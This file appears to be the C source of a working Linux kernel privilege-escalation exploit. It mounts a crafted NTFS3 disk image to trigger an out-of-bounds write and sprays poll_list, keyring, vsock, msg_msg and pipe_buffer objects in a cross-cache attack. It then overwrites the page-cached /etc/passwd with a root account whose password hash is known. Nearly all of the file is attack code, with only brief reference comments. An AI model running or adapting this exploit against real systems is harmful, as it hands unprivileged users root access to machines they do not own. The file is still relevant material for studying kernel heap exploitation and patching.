#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stddef.h>
#include <poll.h>
#include <ctype.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdbool.h>
#include <sched.h>
#include <pthread.h>
#include <keyutils.h>
#include <sys/msg.h>
#include <sys/xattr.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <linux/vm_sockets.h>

#define PAGE_SIZE 4096

#define errout(msg) do { perror("[-] " msg); exit(EXIT_FAILURE); } while(0)

#define RETRY_AGIAN     1

/*
 * Refer:
 * https://xairy.io/ - SLUB Internals for Exploit Developers
 *
 * Step:
 * - POLL_PRE_SZ: Allocate many target objects to get new active slab partially
 *   filled with target objects (Number of holes in active slab is unknown and
 *   can be up to objperslab)
 * - POLL_RESER_SZ: Reserve objperslab + 1 full slabs with target objects
 * - POLL_HOLE_SZ: Make one hole in each reserved full slab
 * - POLL_POST_SZ: Allocate objperslab plug objects (target objects work too)
 * - Allocate one vulnerable object and trigger OOB
 */
#define K512_OBJSPERSLAB        16
#define K512_CPUPARTIAL         52
#define POLL_PRE_SZ             K512_OBJSPERSLAB-2
// Make one hole in each reserved full slab
#define POLL_HOLE_STEP          K512_OBJSPERSLAB
#define POLL_HOLE_SZ            (K512_OBJSPERSLAB+1)
#define POLL_RESER_SZ           (POLL_HOLE_SZ*K512_OBJSPERSLAB)
#define POLL_POST_SZ            K512_OBJSPERSLAB-1
// Now trigger oobw

int             poll_fd;
struct pollfd   *pfds_arr[0x1000];
pthread_t       poll_tids[0x1000];
int             poll_threads;
int             poll_holes; 
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

#define N_STACK_PPS     30
#define POLL_LIST_SZ    16
#define NFDS(size) (((size - POLL_LIST_SZ) / sizeof(struct pollfd)) + N_STACK_PPS)

/*
 * Refer:
 * https://i.blackhat.com/Asia-24/Presentations/Asia-24-Wu-Game-of-Cross-Cache.pdf
 */
#define K96_OBJSPERSLAB         42
#define K96_CPUPARTIAL          120
#define K96_CC_FULL             ((K96_CPUPARTIAL+1)*K96_OBJSPERSLAB)
#define K96_CC_PRE              (K96_OBJSPERSLAB-1)
#define K96_CC_POST             (K96_OBJSPERSLAB+1)

#define KEYRING_TYPE_USER       "user"
#define UK_PAYLOAD_SZ           24
#define KEY96_SZ                (64+UK_PAYLOAD_SZ)
int full_keys[K96_CC_FULL];
int pre_keys[K96_CC_PRE];
int post_keys[K96_CC_POST];
int corrupted_key;

#define MSGMSG_SZ       48 /* 0x30 */
#define MSGSEG_SZ       8
#define MSG_SPRAY       0x200
#define MSG_SZ          192
int msg_qids[MSG_SPRAY];
int msgw_qids[MSG_SPRAY];

#define TARGET_FILE     "/etc/passwd"
// #define PIPE_SPRAY      200
#define PIPE_SPRAY      20
#define PIPEBUF_SZ      40
int pipe_fds[PIPE_SPRAY][2];
int target_fd;

struct poll_args {
        int     id;
        int     nfds;
        int     timer;
        bool    suspend;
};

struct poll_list {
        struct poll_list        *next;
        int                     len;
        struct pollfd           entries[];
};

struct rcu_head {
        void *next;
        void *func;
};

struct user_key_payload {
        struct rcu_head rcu;
        unsigned short  datalen;
        char            *data[];
};

struct msg_buf { // struct msgbuf
        long m_type;
        char m_text[0];
};

struct list_head {
        struct list_head *next, *prev;
};

struct msg_msg {
        struct list_head m_list; 
        long m_type;
        size_t m_ts;
        uint64_t next;
        uint64_t security;
        uint8_t text[0];
};

void assign_to_core(int core_id)
{
        cpu_set_t mask;

        CPU_ZERO(&mask);
        CPU_SET(core_id, &mask);

        if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
                errout("assign_to_core:sched_setaffinity");
}

void assign_thread_to_core(int core_id)
{
        cpu_set_t mask;

        CPU_ZERO(&mask);
        CPU_SET(core_id, &mask);

        if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0)
                errout("assign_thread_to_core:pthread_setaffinity_np");
}

void init_fd_limit()
{
        struct rlimit max_files;
        getrlimit(RLIMIT_NOFILE, &max_files);
        max_files.rlim_cur = max_files.rlim_max;
        setrlimit(RLIMIT_NOFILE, &max_files);
}

int init_pollfd()
{
        int pfd = open("/etc/passwd", O_RDONLY);
        if (pfd < 1)
                errout("init_pollfd:open");

        return pfd;
}

void dump_bin(char *desc, void *addr, int len)
{
        uint64_t *buf64 = (uint64_t *)addr;
        uint8_t *buf8 = (uint8_t *)addr;

        if (desc != NULL)
                printf("[*] %s:\n", desc);
        for (int i = 0; i < len/8; i += 4) {
                printf("    %04x", i * 8);
                for (int j = 0; j < 4; j++) {
                        if (i + j < len / 8)
                                printf("  0x%016lx", buf64[i+j]);
                        else
                                printf("                    ");
                }
                printf("   ");
                for (int j = 0; j < 32 && j + i * 8 < len; j++)
                        printf("%c", isprint(buf8[i*8+j]) ? buf8[i*8+j]:'.');
                puts("");
        }
}

void *alloc_poll_list(void *args)
{
        struct pollfd *pfds;
        int nfds, timer, id;
        bool suspend;

        id = ((struct poll_args *)args)->id;
        nfds = ((struct poll_args *)args)->nfds;
        timer = ((struct poll_args *)args)->timer;
        suspend = ((struct poll_args *)args)->suspend;
        free(args);

        pfds = calloc(nfds, sizeof(struct pollfd));
        for (int i = 0; i < nfds; i++) {
                pfds[i].fd = poll_fd;
                pfds[i].events = POLLERR;
        }
        pfds_arr[id] = pfds;

        assign_thread_to_core(0);

        pthread_mutex_lock(&mutex);
        if (poll_holes < POLL_HOLE_SZ) {
                if (poll_threads > 0 &&
                    ((poll_threads - POLL_PRE_SZ) % POLL_HOLE_STEP == 0)) {
                        timer = 3000;
                        poll_holes++;
                }
        }
        poll_threads++;
        pthread_mutex_unlock(&mutex);

        int ret = poll(pfds, nfds, timer);

        assign_thread_to_core(1);

        if (suspend) while (1) {};

        pthread_mutex_lock(&mutex);
        poll_threads--;
        pthread_mutex_unlock(&mutex);
}

void create_poll_thread(int id, size_t size,
                        int timer, bool suspend)
{
        struct poll_args *args;

        args = calloc(1, sizeof(struct poll_args));

        if (size > PAGE_SIZE)
                /* Don't contain header for every page */
                size -= ((size / PAGE_SIZE) * POLL_LIST_SZ);

        args->id = id;
        args->nfds = NFDS(size);
        args->timer = timer;
        args->suspend = suspend;

        pthread_create(&poll_tids[id], 0, alloc_poll_list, (void *)args);
}

void join_poll_threads()
{
        for (int i = 0; i < poll_threads; i++)
                pthread_join(poll_tids[i], NULL);
}

/*
 * Refer:
 * https://github.com/google/security-research/pull/145
 */
int *init_vvs_fds(int cnt)
{
        int *socks = calloc(sizeof(int), cnt);

        for (int i = 0; i < cnt; i++) {
                if ((socks[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0)) < 0)
                        errout("init_vvs_fds:socket");
        }

        return socks;
}

void spray_vvsocks(int *socks, int cnt, int port)
{
        struct sockaddr_vm connect_addr = { 0 };
        connect_addr.svm_family = AF_VSOCK;
        connect_addr.svm_cid = VMADDR_CID_LOCAL;

        for (int i = 0; i < cnt; i++) {
                connect_addr.svm_port = ++port;
                connect(socks[i], (struct sockaddr *)&connect_addr,
                        sizeof(connect_addr));
        }
}

void free_vvsocks(int *socks, int cnt)
{
        for (int i = 0; i < cnt; i++)
                close(socks[i]);
}

int alloc_key(int id, char *buff, size_t size)
{
        char desc[256] = { 0 };
        char *payload;
        int key;

        size -= sizeof(struct user_key_payload);
        sprintf(desc, "payload_%d", id);
        payload = buff ? buff : calloc(1, size);

        key = add_key(KEYRING_TYPE_USER, desc, payload, size,
                      KEY_SPEC_PROCESS_KEYRING);
        if (key < 0)
                errout("alloc_key:add_key");

        return key;
}

void free_payload(int key)
{
        if (keyctl_revoke(key) < 0)
                errout("free_key:keyctl_revoke");
}

void free_key(int key)
{
        keyctl_unlink(key, KEY_SPEC_PROCESS_KEYRING);
}

int init_msg_queue()
{
        return msgget(IPC_PRIVATE, 0666|IPC_CREAT);
}

int send_msg(int mqid, void *mbuf, size_t msz)
{
        return msgsnd(mqid, mbuf, msz, 0);
}

int rcv_msg(int mqid, void *mbuf, size_t msz, long mtype)
{
        return msgrcv(mqid, mbuf, msz, mtype, 0);
}

int peek_msg(int mqid, void *mbuf, size_t msz)
{
        return msgrcv(mqid, mbuf, msz, 0, MSG_COPY|IPC_NOWAIT);
}

void init_pipes()
{
        target_fd = open(TARGET_FILE, O_RDONLY);
        if (target_fd < 0)
                errout("init_pipes:open");

        /* pipe_inode_info (size: 160): 0x00, 0x40, 0x80, 0xc0 */
        for (int i = 0; i < PIPE_SPRAY; i++) {
                if (pipe(pipe_fds[i]) < 0)
                        errout("init_pipes:pipe");
        }
}

void close_pipes(int except)
{
        for (int i = 0; i < PIPE_SPRAY; i++) {
                if (i == except) continue;
                close(pipe_fds[i][1]);
                close(pipe_fds[i][0]);
        }
}

void resize_pipebufs(int pfdw, int bufsz)
{

        if (fcntl(pfdw, F_SETPIPE_SZ, bufsz/PIPEBUF_SZ*PAGE_SIZE) < 0)
                errout("resize_pipebufs:fcntl");
}

void trigger_oobw()
{
        // system("sudo mount -t ntfs3 /dev/loo0p1 /tmp/ntfs3");
        system("sudo mount -o loop,offset=65536 -t ntfs3 test.vhd /tmp/ntfs3");
}

/*
 * Refer:
 * https://github.com/XiaozaYa/DCO
 */
int main()
{
        int *vvs_fds;
        int key_id;
        char payload[32] = { 0 };
        char xa_data[0x100] = { 0 };
        char new_buffer[4096] = { 0 };
        char msg_buffer[4096] = { 0 };
        struct msg_buf *mbuf = (struct msg_buf *)msg_buffer;

        assign_to_core(0);

        puts("[*] Initializing env...");
        system("cp /etc/passwd /tmp/passwd");
        system("mkdir /tmp/ntfs3");
        init_fd_limit();

retry:
        key_id = 0;
        corrupted_key = -1;
        poll_holes = 0;
        poll_threads = 0;
        system("cp win20m-poc.vhd test.vhd");
        poll_fd = init_pollfd();
        init_pipes();
        for (int i = 0; i < MSG_SPRAY; i++) {
                msg_qids[i] = init_msg_queue();
                msgw_qids[i] = init_msg_queue();
        }

        puts("[*] Allocating cross-cache full k96...");
        vvs_fds = init_vvs_fds(K96_CC_FULL);
        spray_vvsocks(vvs_fds, K96_CC_FULL, 1023);

        puts("[*] Allocating cross-cache pre k96...");
        for (int i = 0; i < K96_CC_PRE; i++)
                pre_keys[i] = alloc_key(key_id++, payload, KEY96_SZ);

        puts("[*] Spraying pre+reserve poll_list with holes...");
        for (int i = 0; i < POLL_PRE_SZ+POLL_RESER_SZ; i++)
                create_poll_thread(i, 512, 10000, false);
        while (poll_threads != POLL_PRE_SZ+POLL_RESER_SZ) {};

        puts("[*] Waiting for making holes...");
        sleep(3);

        puts("[*] Spraying post poll_list ...");
        for (int i = 0; i < POLL_POST_SZ; i++) 
                create_poll_thread(POLL_PRE_SZ+POLL_RESER_SZ+i, 512, 10000, false);

        puts("[*] Triggering oobw...");
        trigger_oobw();

        // Must be null. Otherwise raise error when free ptr+4 in poll_list
        setxattr("/root/.bashrc", "user.x", xa_data, KEY96_SZ, XATTR_CREATE);
        corrupted_key = alloc_key(key_id++, payload, KEY96_SZ);

        puts("[*] Allocating post k96...");
        for (int i = 0; i < K96_CC_POST; i++)
                post_keys[i] = alloc_key(key_id++, payload, KEY96_SZ);

        puts("[*] Waiting for freeing by oobw...");
        sleep(10);

        puts("[*] Freeing objs before/after victim...");
        for (int i = 0; i < K96_CC_PRE; i++)
                free_key(pre_keys[i]);
        close(vvs_fds[K96_CC_FULL-1]);
        for (int i = 0; i < K96_CC_POST-1; i++)
                free_key(post_keys[i]);
        sleep(1); // GC keys

        puts("[*] Freeing an obj per objs_per_slab...");
        for (int i = 0; i < K96_CC_FULL; i++) {
                if (i % K96_OBJSPERSLAB == 0)
                        close(vvs_fds[i]);
        }
        sleep(2);

        puts("[*] Spraying cross-cache kcg-192 msg_msg...");
        mbuf->m_type = 1;
        memset(mbuf->m_text, 'A', MSG_SZ);
        for (int i = 0; i < MSG_SPRAY; i++) {
                *(uint64_t *)(mbuf->m_text) = i;
                send_msg(msg_qids[i], mbuf, MSG_SZ-MSGMSG_SZ);
        }

        puts("[*] Freeing corrupted key...");
        free_key(corrupted_key);
        sleep(1);

        puts("[*] Spraying cross-cache kcg-192 pipe_buffer...");
        for (int i = 0; i < PIPE_SPRAY; i++) {
                resize_pipebufs(pipe_fds[i][1], 4*PIPEBUF_SZ);
        }
        for (int i = 0; i < PIPE_SPRAY; i++) {
                loff_t off = i;
                if (splice(target_fd, &off, pipe_fds[i][1], NULL, 1, 0) <= 0)
                        errout("splice");
        }

        puts("[*] Checking overlap...");
        int overlap_idx = -1;
        int at_start = 0;
        int bad_pipebuf = -1;
        /*
         * Do not treat overlap msg_msg(2) as overlap msg_msg(1), it will
         * free msg_msg(1) and reserve msg_msg(2). New msg_msg reclaim
         * msg_msg(1) will overwrite pipe_buffer->page with "0x4141...".
         * Other errors may be caused by the failure of cross-cache.
        */
        for (int i = 0; i < MSG_SPRAY && (overlap_idx == -1 || at_start); i++) {
                memset(msg_buffer, 0, sizeof(msg_buffer));
                if (peek_msg(msg_qids[i], mbuf, MSG_SZ-MSGMSG_SZ) < 0)
                        errout("peek_msg");

                for (int j = 1; j < ((MSG_SZ-MSGMSG_SZ)/8); j++) {
                        uint64_t val = *(uint64_t *)(mbuf->m_text+j*8);
                        if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
                                dump_bin("Overlap data", mbuf->m_text, MSG_SZ-MSGMSG_SZ);
                                overlap_idx = *(uint64_t *)(mbuf->m_text);
                                bad_pipebuf = *(uint64_t *)(mbuf->m_text+j*8+8);
                                *(uint64_t *)(mbuf->m_text+j*8+8) = 0x0; // offset
                                *(unsigned int*)(mbuf->m_text+j*8+24) = 0x10;
                                memcpy(new_buffer, msg_buffer, sizeof(new_buffer));
                                at_start = 0;
                                break;
                        } else if (val == 0x0) {
                                dump_bin("Overlap data", mbuf->m_text, MSG_SZ-MSGMSG_SZ);
                                overlap_idx = i;
                                at_start = 1;
                                break;
                        }
                }
        }
        if (at_start) {
                printf("[-] Overlap at start (msg_msg idx: %d)\n", overlap_idx);
                goto not_found;
        }
        if (overlap_idx == -1) {
                puts("[-] Can not found overlap");
                goto not_found;
        }
        printf("[*] Overlap msg_msg idx: %d\n", overlap_idx);

        puts("[*] Freeing overlap msg_msg...");
        if (rcv_msg(msg_qids[overlap_idx], mbuf, MSG_SZ-MSGMSG_SZ, 1) < 0)
                errout("rcv_msg");

        puts("[*] Using msg_msg to overwrite pipe...");
        memcpy(msg_buffer, new_buffer, sizeof(new_buffer));
        *(uint64_t *)(mbuf->m_text) = 0xdeadbeef;
        mbuf->m_type = 1;
        dump_bin("Overwrite data", mbuf->m_text, MSG_SZ-MSGMSG_SZ);
        for (int i = 0; i < 20; i++)
                send_msg(msg_qids[i], mbuf, MSG_SZ-MSGMSG_SZ);

        puts("[*] Trying to write password...");
        /* openssl passwd -1 -salt rt: 500 */
        char *pwd = "root:$1$rt$9jzmRkdAoL.xC6xRb6IxR1:0:0::/root:/bin/sh\n";
        // for (int i = 0; i < PIPE_SPRAY; i++)
        //         write(pipe_fds[i][1], pwd, strlen(pwd));
        write(pipe_fds[bad_pipebuf][1], pwd, strlen(pwd));

        return 0;

not_found:
        for (int i = 0; i < POLL_PRE_SZ+POLL_RESER_SZ+POLL_POST_SZ; i++)
                free(pfds_arr[i]);
        memset(msg_buffer, 0, sizeof(msg_buffer));
        for (int i = 0; i < MSG_SPRAY; i++) {
                if (i == overlap_idx) continue;
                rcv_msg(msg_qids[i], mbuf, MSG_SZ-MSGMSG_SZ, 1);
        }
        for (int i = 0; i < K96_CC_POST-1; i++) {
                if (i % K96_OBJSPERSLAB == 0)
                        continue;
                close(vvs_fds[i]);
        }
        free_key(post_keys[K96_CC_POST-1]);
        // close_pipes(-1);

        if (RETRY_AGIAN) {
                puts("[-] Waiting for retrying...");
                sleep(5);
                puts("[-] Retry again...");

                goto retry;
        }

        return 1;
}